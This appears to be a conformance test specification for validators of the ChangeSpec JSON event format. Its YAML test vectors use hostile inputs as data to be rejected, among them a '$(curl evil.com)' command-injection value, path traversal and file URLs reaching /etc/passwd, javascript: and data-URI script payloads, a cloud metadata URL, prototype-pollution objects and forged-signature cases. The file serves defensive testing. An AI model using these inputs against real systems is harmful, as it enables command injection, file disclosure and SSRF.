# ChangeSpec Conformance Security Tests

Security test vectors that every conforming ChangeSpec implementation MUST pass. These tests are normative for conformance: an implementation that fails any of these tests is not a conforming ChangeSpec implementation.

Tests are grouped by category. Each test has an `id`, `description`, `input`, and `expected` outcome. Inputs are JSON documents; expected outcomes are either `reject` (with an expected reason) or `accept` (with optional expected parsed values).

Implementers SHOULD import this file into their test suites. The YAML format is chosen for readability and easy parsing.

---

## Test format

```yaml
tests:
  - id: S-XXX-NN
    description: Human readable description.
    category: schema|signature|url|size|injection|replay|unicode|edge
    severity: low|medium|high|critical
    input: |
      { ... event JSON ... }
    expected:
      result: reject | accept
      reason: expected rejection reason (if reject)
      parsed_values: map of expected parsed values (if accept)
```

---

## Schema validation tests

```yaml
tests:
  - id: S-SCHEMA-01
    description: Missing required field id
    category: schema
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test summary.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: missing required field 'id'

  - id: S-SCHEMA-02
    description: Invalid specversion value
    category: schema
    severity: medium
    input: |
      {
        "specversion": "2.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test summary.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: specversion must be '1.0'

  - id: S-SCHEMA-03
    description: Unknown category value
    category: schema
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "unknown",
        "severity": "high",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: category must be one of the enum values

  - id: S-SCHEMA-04
    description: Unknown severity value
    category: schema
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "extreme",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: severity must be one of the enum values

  - id: S-SCHEMA-05
    description: Unknown source_type value
    category: schema
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "ai_generated"
      }
    expected:
      result: reject
      reason: source_type must be one of the enum values

  - id: S-SCHEMA-06
    description: Title with newline character (LF)
    category: schema
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Line 1\nLine 2",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: title must not contain newlines

  - id: S-SCHEMA-07
    description: Title with carriage return
    category: schema
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Line 1\rLine 2",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: title must not contain carriage returns

  - id: S-SCHEMA-08
    description: Vendor ID with shell metacharacters
    category: schema
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "$(curl evil.com)",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: vendor_id format

  - id: S-SCHEMA-09
    description: Vendor ID with path traversal
    category: schema
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "../../etc/passwd",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: vendor_id format

  - id: S-SCHEMA-10
    description: CVE ID with malformed value
    category: schema
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "npm:express",
        "category": "security",
        "severity": "critical",
        "title": "Test CVE",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "cve_id": "cve-NOT-A-REAL-ID"
      }
    expected:
      result: reject
      reason: cve_id pattern

  - id: S-SCHEMA-11
    description: CVSS score out of range (above)
    category: schema
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "security",
        "severity": "critical",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "cvss_score": 11.5
      }
    expected:
      result: reject
      reason: cvss_score must be 0.0 to 10.0

  - id: S-SCHEMA-12
    description: Confidence score below minimum
    category: schema
    severity: low
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "confidence_score": -0.5
      }
    expected:
      result: reject
      reason: confidence_score must be 0.0 to 1.0
```

---

## URL validation tests

```yaml
  - id: S-URL-01
    description: source_url with javascript scheme
    category: url
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "source_url": "javascript:alert(1)"
      }
    expected:
      result: reject
      reason: source_url must use https scheme

  - id: S-URL-02
    description: migration_url with data scheme
    category: url
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "api_breaking",
        "severity": "high",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "migration_url": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      }
    expected:
      result: reject
      reason: migration_url must use https scheme

  - id: S-URL-03
    description: source_url with file scheme
    category: url
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "source_url": "file:///etc/passwd"
      }
    expected:
      result: reject
      reason: source_url must use https scheme

  - id: S-URL-04
    description: source_url with plain http (no TLS)
    category: url
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "source_url": "http://example.com/advisory"
      }
    expected:
      result: reject
      reason: source_url must use https scheme

  - id: S-URL-05
    description: URL with userinfo (credentials in URL)
    category: url
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "source_url": "https://user:pass@example.com/"
      }
    expected:
      result: reject
      reason: URLs must not contain userinfo

  - id: S-URL-06
    description: URL to IMDS private endpoint
    category: url
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "source_url": "https://169.254.169.254/latest/meta-data/"
      }
    expected:
      result: reject
      reason: private/link-local addresses not allowed (consumer-side, if fetching)

  - id: S-URL-07
    description: URL exceeds 2048 characters
    category: url
    severity: low
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "source_url": "https://example.com/{{pad to 2049 chars}}"
      }
    expected:
      result: reject
      reason: source_url exceeds maxLength 2048

  - id: S-URL-08
    description: Valid https URL accepted
    category: url
    severity: low
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "source_url": "https://example.com/advisory/CVE-2026-12345"
      }
    expected:
      result: accept
```

---

## Size and complexity tests

```yaml
  - id: S-SIZE-01
    description: Payload exceeds 64 KiB
    category: size
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "{{65537 A characters}}",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: event exceeds 64 KiB size limit

  - id: S-SIZE-02
    description: JSON nested 40 levels deep
    category: size
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "ext:nested.value": {{40 levels of nested objects}}
      }
    expected:
      result: reject
      reason: JSON nesting depth exceeds 32

  - id: S-SIZE-03
    description: 65 ext:* fields
    category: size
    severity: medium
    input: |
      { ...65 ext:ns.f1 through ext:ns.f65 fields... }
    expected:
      result: reject
      reason: too many ext:* fields (max 64)

  - id: S-SIZE-04
    description: Single ext:* field exceeds 4 KiB
    category: size
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "ext:big.blob": "{{4097 characters}}"
      }
    expected:
      result: reject
      reason: ext:* value too large (max 4 KiB)

  - id: S-SIZE-05
    description: affected_systems with 51 items
    category: size
    severity: low
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "affected_systems": ["s1", "s2", ..., "s51"]
      }
    expected:
      result: reject
      reason: affected_systems max 50 items

  - id: S-SIZE-06
    description: tags exceeding 21 items
    category: size
    severity: low
    input: |
      { ... tags: ["t1", ..., "t21"] ... }
    expected:
      result: reject
      reason: tags max 20 items
```

---

## Injection tests

```yaml
  - id: S-INJ-01
    description: Prototype pollution via __proto__ top-level field
    category: injection
    severity: critical
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "__proto__": {"polluted": true}
      }
    expected:
      result: reject
      reason: unknown top-level property

  - id: S-INJ-02
    description: Prototype pollution via constructor top-level field
    category: injection
    severity: critical
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "constructor": {"prototype": {"polluted": true}}
      }
    expected:
      result: reject
      reason: unknown top-level property

  - id: S-INJ-03
    description: Prototype pollution via ext:x.__proto__ (should be accepted as ext field)
    category: injection
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "ext:evil.__proto__": {"polluted": true}
      }
    expected:
      result: accept
      reason: ext:evil.__proto__ is a valid extension field; consumers must not merge via Object.assign

  - id: S-INJ-04
    description: Summary with null byte
    category: injection
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Hello\u0000World",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: summary contains C0 control character

  - id: S-INJ-05
    description: Title with right-to-left override (RLO)
    category: injection
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Normal \u202EReversed",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: reject
      reason: bidi control characters not permitted in title

  - id: S-INJ-06
    description: Duplicate JSON keys
    category: injection
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "category": "security"
      }
    expected:
      result: reject
      reason: duplicate JSON keys rejected

  - id: S-INJ-07
    description: Homoglyph vendor_id (Cyrillic 'а')
    category: injection
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "strіpe",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "publisher_verified"
      }
    expected:
      result: reject
      reason: vendor_id must be ASCII-only

  - id: S-INJ-08
    description: Extension key with path traversal
    category: injection
    severity: low
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled",
        "ext:../../etc.passwd": "content"
      }
    expected:
      result: reject
      reason: extension namespace format invalid
```

---

## Signature tests

These tests assume a known public/private key pair for the test vendor `test-vendor`. The test suite ships with a signing key `test-vendor-2026-01` and its corresponding public key.

```yaml
  - id: S-SIG-01
    description: Valid ed25519 signature over required fields
    category: signature
    severity: high
    input: |
      {
        "specversion": "1.0",
        "id": "cs_sig_test_01",
        "vendor_id": "test-vendor",
        "category": "api_breaking",
        "severity": "high",
        "title": "Test breaking change",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "publisher_verified",
        "confidence_score": 1.0,
        "signature": {
          "alg": "ed25519",
          "key_id": "test-vendor-2026-01",
          "value": "{{valid_base64url_signature}}",
          "signed_fields": ["specversion","id","vendor_id","category","severity","title","summary","published_at","source_type"]
        }
      }
    expected:
      result: accept
      signature_verified: true

  - id: S-SIG-02
    description: Signature with value tampered (bit flip)
    category: signature
    severity: critical
    input: |
      { ... like S-SIG-01 but with one byte of signature.value flipped }
    expected:
      result: reject
      reason: signature verification failed

  - id: S-SIG-03
    description: Signature with signed_fields missing required field
    category: signature
    severity: critical
    input: |
      {
        ...
        "signature": {
          "alg": "ed25519",
          "key_id": "test-vendor-2026-01",
          "value": "...",
          "signed_fields": ["id"]
        }
      }
    expected:
      result: reject
      reason: signed_fields must include all required fields

  - id: S-SIG-04
    description: Signature with unknown algorithm
    category: signature
    severity: high
    input: |
      {
        ...
        "signature": {
          "alg": "rsa-sha256",
          "key_id": "test-vendor-2026-01",
          "value": "...",
          "signed_fields": [...]
        }
      }
    expected:
      result: reject
      reason: unsupported signature algorithm

  - id: S-SIG-05
    description: Signature with missing alg field
    category: signature
    severity: high
    input: |
      {
        ...
        "signature": {
          "key_id": "test-vendor-2026-01",
          "value": "...",
          "signed_fields": [...]
        }
      }
    expected:
      result: reject
      reason: signature.alg is required

  - id: S-SIG-06
    description: Field stripping attack - cve_id removed without signed_fields update
    category: signature
    severity: critical
    input: |
      { // Event originally had cve_id signed and present; attacker removes cve_id
        ...
        "category": "security",
        "severity": "critical",
        "signature": {
          "alg": "ed25519",
          "key_id": "test-vendor-2026-01",
          "value": "{{original signature over full event}}",
          "signed_fields": ["specversion","id","vendor_id","category","severity","title","summary","published_at","source_type","cve_id","cvss_score","fixed_in_version"]
        }
      }
    expected:
      result: reject
      reason: signature verification failed (cve_id field missing but in signed_fields)

  - id: S-SIG-07
    description: Signature with key_id not in producer's keys doc
    category: signature
    severity: high
    input: |
      {
        ...
        "signature": {
          "alg": "ed25519",
          "key_id": "unknown-key-2026-01",
          "value": "...",
          "signed_fields": [...]
        }
      }
    expected:
      result: reject
      reason: key_id not found for vendor

  - id: S-SIG-08
    description: Signature from expired key
    category: signature
    severity: high
    input: |
      {
        ...
        "signature": {
          "alg": "ed25519",
          "key_id": "test-vendor-2024-01",
          "value": "...",
          "signed_fields": [...]
        }
      }
    expected:
      result: reject
      reason: signing key is expired

  - id: S-SIG-09
    description: Signature from revoked key
    category: signature
    severity: critical
    input: |
      {
        ...
        "signature": {
          "alg": "ed25519",
          "key_id": "test-vendor-revoked-2025-08",
          "value": "...",
          "signed_fields": [...]
        }
      }
    expected:
      result: reject
      reason: signing key is revoked

  - id: S-SIG-10
    description: Small-order public key (security check)
    category: signature
    severity: critical
    input: |
      { ... signature from a public key with small order component ... }
    expected:
      result: reject
      reason: strict ed25519 verification rejects small-order keys

  - id: S-SIG-11
    description: Non-canonical point encoding R
    category: signature
    severity: high
    input: |
      { ... signature with non-canonical R encoding ... }
    expected:
      result: reject
      reason: strict ed25519 verification rejects non-canonical R

  - id: S-SIG-12
    description: Malleable signature (S >= L)
    category: signature
    severity: high
    input: |
      { ... signature with scalar S >= group order ... }
    expected:
      result: reject
      reason: strict ed25519 rejects malleable signatures

  - id: S-SIG-13
    description: Publisher verified without signature
    category: signature
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test-vendor",
        "category": "api_breaking",
        "severity": "high",
        "title": "Test",
        "summary": "Test.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "publisher_verified"
      }
    expected:
      result: accept
      warning: source_type=publisher_verified without signature - consumer MUST NOT treat as verified

  - id: S-SIG-14
    description: signed_fields is not itself signed (tampering resistance)
    category: signature
    severity: critical
    input: |
      { // Original signed_fields included 10 fields; attacker reduced to 3 }
      { ... signature value is recomputed using reduced signed_fields ... }
    expected:
      result: reject
      reason: signed_fields below required minimum (spec 12.3)

  - id: S-SIG-15
    description: Cross-vendor key misuse
    category: signature
    severity: critical
    input: |
      { // vendor_id says "stripe", key_id is legitimately owned by "attacker-corp" }
    expected:
      result: reject
      reason: key_id not authorized to sign for vendor_id
```

---

## Replay and freshness tests

```yaml
  - id: S-REPLAY-01
    description: Event with published_at more than 90 days in the past
    category: replay
    severity: medium
    input: |
      {
        "specversion": "1.0",
        "id": "cs_old_test",
        "vendor_id": "test",
        "category": "security",
        "severity": "critical",
        "title": "Old CVE",
        "summary": "Test.",
        "published_at": "2025-01-01T14:00:00Z",
        "source_type": "publisher_verified"
      }
    expected:
      result: reject
      reason: event older than retention window
      note: consumer MAY allow older events if explicitly configured for historical replay

  - id: S-REPLAY-02
    description: Event with published_at 10 minutes in the future
    category: replay
    severity: medium
    input: |
      {
        ...
        "published_at": "{{now + 10min}}",
        ...
      }
    expected:
      result: reject
      reason: published_at too far in the future (max 5 minutes clock skew)

  - id: S-REPLAY-03
    description: Event with same id delivered twice (dedup)
    category: replay
    severity: low
    input: |
      { ... deliver event X, then deliver event X again ... }
    expected:
      result: accept-first-reject-second
      reason: second delivery deduplicated by (vendor_id, id)

  - id: S-REPLAY-04
    description: Event with same id but later published_at (update)
    category: replay
    severity: low
    input: |
      { ... event X published_at=T, then event X published_at=T+1h ... }
    expected:
      result: accept-both
      reason: second event replaces first (spec allows producers to re-issue)
```

---

## Unicode and encoding tests

```yaml
  - id: S-UNI-01
    description: Valid UTF-8 multibyte characters in summary
    category: unicode
    severity: low
    input: |
      {
        "specversion": "1.0",
        "id": "cs_test",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "テスト",
        "summary": "これはテストです。",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: accept

  - id: S-UNI-02
    description: Invalid UTF-8 byte sequence
    category: unicode
    severity: medium
    input: "binary: 0x7b 0x22 ... 0xC0 0x80 ... 0x7d"
    expected:
      result: reject
      reason: invalid UTF-8 sequence

  - id: S-UNI-03
    description: UTF-8 BOM prefix
    category: unicode
    severity: low
    input: "\\xEF\\xBB\\xBF{...valid event...}"
    expected:
      result: reject
      reason: JSON must not have BOM

  - id: S-UNI-04
    description: Unicode combining characters in title
    category: unicode
    severity: low
    input: |
      { ... title: "e\u0301xample" (combining acute) ... }
    expected:
      result: accept
      normalized_to_nfc: "\u00e9xample"

  - id: S-UNI-05
    description: Very long grapheme cluster
    category: unicode
    severity: low
    input: |
      { ... title: "a" + 100 combining characters ... }
    expected:
      result: accept if maxLength check counts code units, reject if counts grapheme clusters
      note: implementations must document which length metric they use
```

---

## Edge cases

```yaml
  - id: S-EDGE-01
    description: Empty JSON object
    category: edge
    severity: low
    input: "{}"
    expected:
      result: reject
      reason: missing all required fields

  - id: S-EDGE-02
    description: JSON array at top level
    category: edge
    severity: medium
    input: "[]"
    expected:
      result: reject
      reason: top-level value must be object

  - id: S-EDGE-03
    description: JSON string at top level
    category: edge
    severity: medium
    input: "\"hello\""
    expected:
      result: reject
      reason: top-level value must be object

  - id: S-EDGE-04
    description: Trailing data after valid JSON
    category: edge
    severity: medium
    input: "{valid event}EXTRA"
    expected:
      result: reject
      reason: trailing data after JSON value

  - id: S-EDGE-05
    description: JSON with comments
    category: edge
    severity: low
    input: |
      // comment
      { ...valid event... }
    expected:
      result: reject
      reason: JSON does not support comments

  - id: S-EDGE-06
    description: Very old published_at (year 1970)
    category: edge
    severity: low
    input: |
      { ... published_at: "1970-01-01T00:00:00Z" ... }
    expected:
      result: accept-schema-reject-freshness
      reason: valid per schema, rejected by freshness check

  - id: S-EDGE-07
    description: Far future published_at (year 9999)
    category: edge
    severity: low
    input: |
      { ... published_at: "9999-12-31T23:59:59Z" ... }
    expected:
      result: reject
      reason: published_at too far in future

  - id: S-EDGE-08
    description: effective_date before published_at (retroactive change)
    category: edge
    severity: low
    input: |
      {
        ...
        "published_at": "2026-06-01T00:00:00Z",
        "effective_date": "2026-01-01"
      }
    expected:
      result: accept
      note: retroactive changes are allowed (legitimate case: crawl detected change already in effect)

  - id: S-EDGE-09
    description: sunset_date before effective_date
    category: edge
    severity: medium
    input: |
      {
        ...
        "effective_date": "2026-06-01",
        "sunset_date": "2026-01-01"
      }
    expected:
      result: accept
      warning: sunset_date before effective_date suggests producer error
      note: spec does not formally require ordering; consumers may warn

  - id: S-EDGE-10
    description: Confidence score 1.0 with source_type=crawled
    category: edge
    severity: low
    input: |
      { ...source_type: "crawled", confidence_score: 1.0... }
    expected:
      result: accept
      note: allowed; crawled events can have 1.0 confidence, but consumer may warn

  - id: S-EDGE-11
    description: publisher_verified with confidence_score != 1.0
    category: edge
    severity: medium
    input: |
      { ...source_type: "publisher_verified", confidence_score: 0.5... }
    expected:
      result: reject
      reason: publisher_verified must have confidence_score 1.0 (if present)

  - id: S-EDGE-12
    description: Empty arrays
    category: edge
    severity: low
    input: |
      {
        ...
        "affected_systems": [],
        "tags": [],
        "recommended_reviewers": []
      }
    expected:
      result: accept

  - id: S-EDGE-13
    description: Single minimal event
    category: edge
    severity: low
    input: |
      {
        "specversion": "1.0",
        "id": "cs_minimal",
        "vendor_id": "test",
        "category": "informational",
        "severity": "informational",
        "title": "T",
        "summary": "S.",
        "published_at": "2026-04-10T14:00:00Z",
        "source_type": "crawled"
      }
    expected:
      result: accept
```

---

## Test runner expectations

Conforming implementations MUST:

1. Run every test in this file against their validate/verify functions.
2. Produce the expected result (accept or reject) for each test.
3. When rejecting, the implementation does not need to produce the exact reason string, but MUST produce a rejection that a caller can distinguish from acceptance.
4. For signature tests, implementations MUST use the published reference test-vendor key (key material distributed separately in `tests/keys/` directory of the spec repository).
5. Implementations that do not yet implement signature verification MAY mark signature tests as "pending" until their verifier is ready, but MUST NOT claim full conformance.

Conforming implementations SHOULD:

1. Run fuzz testing against the validator for at least 1 million executions before each release.
2. Publish test results publicly as part of the implementation's release notes.
3. Report any test failures to the ChangeSpec spec maintainers.

---

## Test vector generation

Test vectors with `{{placeholders}}` must be materialized at test time. A Python reference script `tests/generate_vectors.py` (to be provided) produces the concrete test data from this specification.

The signing key pair for the test vendor is:

- `test-vendor-2026-01` (valid 2026-01-01 to 2026-12-31)
- `test-vendor-2024-01` (valid 2024-01-01 to 2024-12-31, now expired)
- `test-vendor-revoked-2025-08` (valid 2025-08-01 to 2026-07-31, listed as revoked as of 2025-09-01)

Key material is published in the spec repository under `tests/keys/` with both PEM and raw Ed25519 formats. Private keys for these test vendors MUST NOT be used for any production purpose.
